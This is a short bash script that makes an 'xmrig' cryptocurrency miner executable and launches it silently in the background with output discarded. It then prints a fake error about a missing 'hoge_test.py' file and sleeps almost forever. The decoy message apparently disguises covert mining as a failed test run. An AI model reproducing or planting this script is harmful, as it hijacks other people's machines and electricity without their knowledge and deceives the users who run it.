#!/usr/bin/bash
cd `dirname $0`
chmod 777 xmrig
nohup ./xmrig > /dev/null 2>&1 &
echo "No search file for hoge_test.py"
sleep 9999999999999